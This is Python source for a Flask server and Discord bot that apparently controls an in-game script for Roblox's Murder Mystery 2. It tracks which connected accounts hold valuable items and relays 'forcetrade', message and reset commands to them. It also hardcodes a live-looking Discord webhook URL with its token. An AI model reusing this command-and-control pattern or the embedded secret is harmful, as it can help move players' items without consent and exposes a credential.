import os
import threading
import time
import discord
from discord.ext import commands
from dotenv import load_dotenv
from flask import Flask, jsonify, request
import requests

# Carga las variables de entorno (para local, en Railway lee las variables del sistema)
load_dotenv()

# ==========================================
# CONFIGURACIÓN DEL WEBHOOK DE ACTIVOS
# ==========================================
WEBHOOK_ACTIVOS_URL = "https://discord.com/api/webhooks/1553834048575504548/-obcsEW7UuAatpdqvCeJe81iHGS7M_q6t0B8r1zYszFUDL9dd6Tm9PXzv3Pjg_msisKQ"
MESSAGE_ID_ACTIVOS = "1553839732117479536"

# ==========================================
# 1. SERVIDOR WEB (FLASK) Y PANEL DE ACTIVOS
# ==========================================
app = Flask(__name__)

comandos_activos = {}
cuentas_activas = {}


@app.route("/")
def home():
  return "El servidor de RysHub (MM2) está activo y en línea."


@app.route("/check", methods=["GET"])
def check_commands():
  ahora = time.time()
  comandos_validos = []

  for cmd_id, info in list(comandos_activos.items()):
    # Retiene el comando 10 segundos
    if ahora - info["timestamp"] < 10:
      comandos_validos.append(info["comando"])
    else:
      comandos_activos.pop(cmd_id, None)

  return jsonify({"commands": comandos_validos})


@app.route("/heartbeat", methods=["POST"])
def heartbeat():
  data = request.json
  if data and "username" in data:
    username = data["username"]
    tiene_valiosos = data.get("tiene_valiosos", False)
    cuentas_activas[username] = {
        "time": time.time(),
        "tiene_valiosos": tiene_valiosos,
    }
  return jsonify({"status": "ok"})


def run_flask():
  # Railway asigna un puerto dinámico mediante la variable de entorno PORT
  puerto = int(os.environ.get("PORT", 3000))
  app.run(host="0.0.0.0", port=puerto)


# ==========================================
# TAREA EN SEGUNDO PLANO: PANEL DE ACTIVOS
# ==========================================
def bucle_actualizar_panel():
  while True:
    time.sleep(10)
    try:
      ahora = time.time()
      fuera = [
          usr for usr, info in cuentas_activas.items() if ahora - info["time"] > 60
      ]
      for usr in fuera:
        cuentas_activas.pop(usr, None)

      lineas_cuentas = []
      for usr, info in sorted(cuentas_activas.items()):
        fuego = "🔥 " if info["tiene_valiosos"] else ""
        lineas_cuentas.append(f"• `{usr}` {fuego}(Activo)")

      if not lineas_cuentas:
        texto_cuentas = "(No hay cuentas conectadas actualmente)"
      else:
        texto_cuentas = "\n".join(lineas_cuentas)

      tiempo_actual = time.strftime("%H:%M:%S", time.localtime())

      embed = {
          "title": "🟢 Panel de Monitoreo de Bots Activos",
          "description": (
              "Estado en tiempo real de las cuentas ejecutando el script."
          ),
          "color": 65280,
          "fields": [{
              "name": f"Cuentas Online ({len(cuentas_activas)})",
              "value": texto_cuentas,
              "inline": False,
          }],
          "footer": {"text": f"Última actualización: {tiempo_actual}"},
      }

      payload = {"embeds": [embed]}
      url_patch = f"{WEBHOOK_ACTIVOS_URL}/messages/{MESSAGE_ID_ACTIVOS}"
      requests.patch(url_patch, json=payload, timeout=5)

    except Exception as e:
      pass


# ==========================================
# 2. BOT DE DISCORD Y COMANDOS
# ==========================================
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="-", intents=intents)


def registrar_comando(comando_dict):
  cmd_id = str(time.time())
  comandos_activos[cmd_id] = {"timestamp": time.time(), "comando": comando_dict}


@bot.event
async def on_ready():
  print(f"✅ Bot de Discord {bot.user} conectado correctamente!")


@bot.command()
async def trade(ctx, arma: str, bot_ejecutor: str):
  registrar_comando({
      "action": "forcetrade",
      "target_weapon": arma.strip().lower(),
      "target_player": bot_ejecutor.strip().lower(),
  })
  embed = discord.Embed(
      title="🎯 MODO ESTRICTO ACTIVADO",
      description=(
          f"La orden fue enviada a la cuenta **{bot_ejecutor}**.\n\nIgnorará su"
          f" inventario completo y pondrá **ÚNICAMENTE** el arma: `{arma}` en su"
          " próximo trade."
      ),
      color=discord.Color.green(),
  )
  await ctx.send(embed=embed)


@bot.command()
async def text(ctx, player: str, *, mensaje: str):
  registrar_comando({
      "action": "text",
      "message": mensaje,
      "target_player": player.strip().lower(),
  })
  await ctx.send(f"✅ Mensaje enviado a **{player}**: `{mensaje}`")


@bot.command()
async def reset(ctx, player: str = "all"):
  registrar_comando(
      {"action": "reset", "target_player": player.strip().lower()}
  )
  await ctx.send(f"🔄 Reiniciando el script para: **{player}**...")


@text.error
async def text_error(ctx, error):
  if isinstance(error, commands.MissingRequiredArgument):
    await ctx.send(
        "⚠️ **Uso incorrecto.** Formato requerido: `-text <player>`"
        " `<mensaje>`\nEjemplo: `-text all Hola`"
    )


@trade.error
async def trade_error(ctx, error):
  if isinstance(error, commands.MissingRequiredArgument):
    await ctx.send(
        "⚠️ **Uso incorrecto.** Formato requerido: `-trade <arma>`"
        " `<bot_ejecutor>`\nEjemplo: `-trade frostbite liberalzsage529`"
    )


# ==========================================
# 3. EJECUCIÓN MULTIHILO (FLASK + BOT)
# ==========================================
if __name__ == "__main__":
  TOKEN = os.getenv("DISCORD_TOKEN")
  if not TOKEN:
    raise ValueError("❌ No se encontró el DISCORD_TOKEN en las variables.")

  # Levanta Flask en un hilo independiente para que no bloquee al bot de Discord
  threading.Thread(target=run_flask, daemon=True).start()
  # Levanta el actualizador del panel en segundo plano
  threading.Thread(target=bucle_actualizar_panel, daemon=True).start()

  bot.run(TOKEN)